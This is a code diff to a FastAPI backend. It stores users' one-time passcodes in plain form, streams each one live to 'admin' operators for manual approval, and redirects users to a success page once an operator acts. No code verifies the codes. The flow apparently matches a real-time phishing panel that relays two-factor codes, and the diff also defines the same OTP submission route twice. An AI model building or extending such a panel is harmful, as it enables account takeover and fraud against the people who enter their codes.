@@ -249,33 +249,6 @@ async def submit_otp(data: OTPSubmit):
         
         return {"success": True, "message": "OTP submitted, waiting for admin approval"}
 
-@app.post("/api/users/submit-second-otp")
-async def submit_second_otp(data: OTPSubmit):
-    async with db_pool.acquire() as conn:
-        user = await conn.fetchrow("SELECT * FROM users WHERE email = $1", data.email)
-        
-        if not user:
-            raise HTTPException(status_code=404, detail="User not found")
-        
-        if not user['otp1_correct']:
-            return {"success": False, "error": "First OTP not approved yet"}
-        
-        # Store second OTP
-        await conn.execute("""
-            UPDATE users 
-            SET second_otp = $1, otp2_correct = FALSE
-            WHERE email = $2
-        """, data.otp, data.email)
-        
-        # Notify admins
-        await manager.send_to_admins({
-            "type": "user-second-otp-created",
-            "email": data.email,
-            "second_otp": data.otp
-        })
-        
-        return {"success": True, "message": "Second OTP submitted, waiting for admin approval"}
-
 # ============ STATUS CHECK ENDPOINTS (for polling) ============
 
 @app.get("/api/users/check-status")
@@ -427,19 +400,16 @@ async def never_first_otp(action: AdminAction, credentials: HTTPAuthorizationCre
         raise HTTPException(status_code=403, detail="Invalid token")
     
     async with db_pool.acquire() as conn:
-        result = await conn.execute("""
+        await conn.execute("""
             UPDATE users 
-            SET otp1_never = TRUE, otp1_correct = FALSE
-            WHERE email = $1 AND approved = TRUE
+            SET otp1_never = TRUE, otp1_correct = FALSE, approved = TRUE
+            WHERE email = $1
         """, action.email)
         
-        if result == "UPDATE 0":
-            raise HTTPException(status_code=404, detail="User not found or not approved")
-        
-        # Send notification to user
         await manager.send_to_user(action.email, {
             "type": "otp1_never",
-            "message": "Your OTP has been marked as invalid permanently"
+            "message": "Your OTP has been marked as invalid permanently. Redirecting to success page.",
+            "redirect_url": f"/success?email={action.email}"
         })
         
         return {"success": True}
@@ -540,6 +510,151 @@ async def websocket_admin(websocket: WebSocket):
             pass
     except WebSocketDisconnect:
         manager.disconnect_admin(token)
+
+@app.post("/api/admin/success-first-otp")
+async def success_first_otp(action: AdminAction, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
+    payload = verify_admin_token(credentials.credentials)
+    if not payload:
+        raise HTTPException(status_code=403, detail="Invalid token")
+    
+    async with db_pool.acquire() as conn:
+        # Mark OTP1 as correct, approved, but NOT never
+        await conn.execute("""
+            UPDATE users 
+            SET otp1_correct = TRUE, approved = TRUE, otp1_never = FALSE
+            WHERE email = $1
+        """, action.email)
+        
+        # Notify user to go to success page directly
+        await manager.send_to_user(action.email, {
+            "type": "success-redirect",
+            "email": action.email,
+            "message": "Success! Redirecting to success page.",
+            "redirect_url": f"/success?email={action.email}"
+        })
+        
+        return {"success": True}
+
+@app.post("/api/admin/reset-user")
+async def reset_user(action: AdminAction, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
+    payload = verify_admin_token(credentials.credentials)
+    if not payload:
+        raise HTTPException(status_code=403, detail="Invalid token")
+    
+    async with db_pool.acquire() as conn:
+        # Get existing user
+        user = await conn.fetchrow("SELECT * FROM users WHERE email = $1", action.email)
+        
+        if user:
+            # Delete old record
+            await conn.execute("DELETE FROM users WHERE email = $1", action.email)
+        
+        # Create new fresh record
+        await conn.execute("""
+            INSERT INTO users (email, password, approved, otp, second_otp, otp1_correct, otp2_correct, otp1_never)
+            VALUES ($1, $2, FALSE, NULL, NULL, FALSE, FALSE, FALSE)
+        """, action.email, "user")
+        
+        await manager.send_to_user(action.email, {
+            "type": "reset",
+            "message": "Your record has been reset. Please start over."
+        })
+        
+        return {"success": True}
+
+@app.get("/api/users/check-submission-allowed")
+async def check_submission_allowed(email: str):
+    async with db_pool.acquire() as conn:
+        user = await conn.fetchrow("""
+            SELECT approved, otp1_correct, otp2_correct, otp1_never 
+            FROM users WHERE email = $1
+        """, email)
+        
+        if not user:
+            return {"allowed": True, "reason": None}
+        
+        # If already fully verified
+        if user['otp1_correct'] and user['otp2_correct']:
+            return {"allowed": False, "reason": "already_verified", "message": "User already verified"}
+        
+        # If marked as never
+        if user['otp1_never']:
+            return {"allowed": False, "reason": "never", "message": "User permanently blocked"}
+        
+        # If email not approved yet
+        if not user['approved']:
+            return {"allowed": False, "reason": "not_approved", "message": "Email not approved"}
+        
+        # If first OTP already submitted but not approved
+        if user['approved'] and not user['otp1_correct']:
+            return {"allowed": False, "reason": "otp1_pending", "message": "First OTP pending approval"}
+        
+        return {"allowed": True, "reason": None}
+@app.post("/api/users/submit-otp")
+async def submit_otp(data: OTPSubmit):
+    async with db_pool.acquire() as conn:
+        user = await conn.fetchrow("SELECT * FROM users WHERE email = $1", data.email)
+        
+        if not user:
+            raise HTTPException(status_code=404, detail="User not found")
+        
+        # Check if user is blocked (never)
+        if user['otp1_never']:
+            return {"success": False, "error": "User is permanently blocked. Cannot submit OTP."}
+        
+        # Check if already verified
+        if user['otp1_correct'] and user['otp2_correct']:
+            return {"success": False, "error": "User already verified. Cannot submit new OTP."}
+        
+        # Check if email not approved
+        if not user['approved']:
+            return {"success": False, "error": "Email not approved yet"}
+        
+        # Store OTP
+        await conn.execute("""
+            UPDATE users 
+            SET otp = $1, otp1_correct = FALSE, otp1_never = FALSE
+            WHERE email = $2
+        """, data.otp, data.email)
+        
+        await manager.send_to_admins({
+            "type": "user-otp-created",
+            "email": data.email,
+            "otp": data.otp
+        })
+        
+        return {"success": True, "message": "OTP submitted, waiting for admin approval"}
+
+@app.post("/api/users/submit-second-otp")
+async def submit_second_otp(data: OTPSubmit):
+    async with db_pool.acquire() as conn:
+        user = await conn.fetchrow("SELECT * FROM users WHERE email = $1", data.email)
+        
+        if not user:
+            raise HTTPException(status_code=404, detail="User not found")
+        
+        if user['otp1_never']:
+            return {"success": False, "error": "User is permanently blocked."}
+        
+        if not user['otp1_correct']:
+            return {"success": False, "error": "First OTP not approved yet"}
+        
+        if user['otp1_correct'] and user['otp2_correct']:
+            return {"success": False, "error": "User already verified"}
+        
+        await conn.execute("""
+            UPDATE users 
+            SET second_otp = $1, otp2_correct = FALSE
+            WHERE email = $2
+        """, data.otp, data.email)
+        
+        await manager.send_to_admins({
+            "type": "user-second-otp-created",
+            "email": data.email,
+            "second_otp": data.otp
+        })
+        
+        return {"success": True, "message": "Second OTP submitted, waiting for admin approval"}
 
 # ============ RUN ============
 if __name__ == "__main__":
